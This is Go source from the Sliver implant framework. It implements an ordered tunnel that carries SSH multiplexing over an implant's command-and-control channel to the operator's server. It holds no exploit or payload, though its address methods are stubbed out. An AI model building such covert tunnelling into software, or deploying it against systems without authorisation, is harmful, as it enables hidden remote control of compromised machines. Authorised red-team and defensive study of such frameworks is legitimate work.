package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"log"
	"net"
	"net/url"
	"strconv"
	"sync"
	"time"

	"github.com/golang/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/djherbis/buffer.v1"
	"github.com/bishopfox/sliver/sliver/3rdparty/djherbis/nio.v2"
)

// MuxTunnel - An ordered stream used by a Comm to run an SSH multiplexing session.
// This is used for all implants whose' active C2 protocol stack is not able to yield a net.Conn,
// such as DNS or procedurally-generated HTTP(S). This object implements the net.Conn interface.
type MuxTunnel struct {
	ID uint64

	// Implant conn
	FromServer         chan *sliverpb.CommTunnelData
	FromServerSequence uint64
	ToServer           chan *sliverpb.Envelope
	ToServerSequence   uint64
	cache              map[uint64]*sliverpb.CommTunnelData

	// Read/Write & buffer
	Writer     *nio.PipeWriter // SSH writes back to server
	Reader     *nio.PipeReader // SSH reads from the server
	ConnBuffer buffer.Buffer   // Used by tunnel to store data without EOF, or blocking while reading
	mutex      *sync.RWMutex
}

func NewTunnel(id uint64, toServer chan *sliverpb.Envelope) *MuxTunnel {
	tunnel := &MuxTunnel{
		ID:         id,
		FromServer: make(chan *sliverpb.CommTunnelData),
		ToServer:   toServer,
		cache:      map[uint64]*sliverpb.CommTunnelData{},
		mutex:      &sync.RWMutex{},
	}

	tunnel.ConnBuffer = buffer.New(32 * 1024)
	tunnel.Reader, tunnel.Writer = nio.Pipe(tunnel.ConnBuffer)

	// Add tunnels to map, so we can receive data
	Tunnels.AddTunnel(tunnel)

	// Monitor incoming data
	go tunnel.handleFromServer()

	return tunnel
}

// Read - Implements net.Conn Read(), by reading from the tunnel buffer,
// which is being continuously filled in the background. Blocks when buffer is empty.
func (t *MuxTunnel) Read(data []byte) (n int, err error) {
	n, err = t.Reader.Read(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error reading tunnel: %s", err.Error())
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("SSH read %d bytes from tunnel ", len(data))
	// {{end}}
	return
}

// Write - Implements net.Conn Write(), by sending data back to the server through the Session's RPC tunnels.
func (t *MuxTunnel) Write(data []byte) (n int, err error) {
	sdata, _ := proto.Marshal(&sliverpb.CommTunnelData{
		Sequence: t.ToServerSequence,
		TunnelID: t.ID,
		Data:     data,
		Closed:   false,
	})
	// {{if .Config.Debug}}
	log.Printf("[tunnel] To server %d byte(s)", len(data))
	// {{end}}
	t.ToServerSequence++
	t.ToServer <- &sliverpb.Envelope{
		Type: sliverpb.MsgCommTunnelData,
		Data: sdata,
	}
	return len(data), err
}

// Close - Implements net.Conn Close(), by telling the server this tunnel is closed.
func (t *MuxTunnel) Close() error {
	// {{if .Config.Debug}}
	log.Printf("Closing tunnel %d", t.ID)
	// {{end}}

	tunnelClose, _ := proto.Marshal(&sliverpb.CommTunnelData{
		Data:     make([]byte, 0),
		Closed:   true,
		TunnelID: t.ID,
	})
	t.ToServer <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelClose,
		Data: tunnelClose,
	}
	return nil
}

// RemoteAddr - Implements net.Conn RemoteAddr(), reducing the addr to either a TCP/UDP addr (don't need more)
func (t *MuxTunnel) RemoteAddr() (addr net.Addr) {
	c2 := &url.URL{}
	// c2 := t.conn.Server.URL
	switch c2.Scheme {
	case "dns":
	case "named_pipe", "namedpipe":
	case "mtls", "tcp", "http", "https":
		port, _ := strconv.Atoi(c2.Port())
		addr = &net.TCPAddr{
			IP:   net.ParseIP(c2.Host),
			Port: port,
		}
	}
	return
}

// LocalAddr - Implements net.Conn LocalAddr().
func (t *MuxTunnel) LocalAddr() (addr net.Addr) {
	c2 := &url.URL{}
	// c2 := t.conn.Server.URL
	switch c2.Scheme {
	case "dns":
	case "named_pipe", "namedpipe":
	case "mtls", "tcp", "http", "https":
	}
	return
}

func (t *MuxTunnel) SetDeadline(d time.Time) error {
	return nil
}

func (t *MuxTunnel) SetReadDeadline(rd time.Time) error {
	return nil
}

func (t *MuxTunnel) SetWriteDeadline(wd time.Time) error {
	return nil
}

// handleFromServer - Receives all tunnel data and write it to the buffer in the good order.
func (t *MuxTunnel) handleFromServer() {
	for data := range t.FromServer {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", t.ID, data.Sequence)
		// {{end}}
		t.cache[data.Sequence] = data

		// Go through cache and write all sequential data to the buffer
		for recv, ok := t.cache[t.FromServerSequence]; ok; recv, ok = t.cache[t.FromServerSequence] {

			written, err := t.Writer.Write(recv.Data)
			if err != nil && written == 0 {
				// {{if .Config.Debug}}
				log.Printf("[tunnel]Error writing %d bytes to tunnel", len(recv.Data))
				// {{end}}
			}
			// {{if .Config.Debug}}
			log.Printf("[tunnel] Wrote %d bytes to SSH connection", len(recv.Data))
			// {{end}}

			// Delete the entry we just wrote from the cache
			delete(t.cache, t.FromServerSequence)
			t.FromServerSequence++ // Increment sequence counter
		}
	}
}
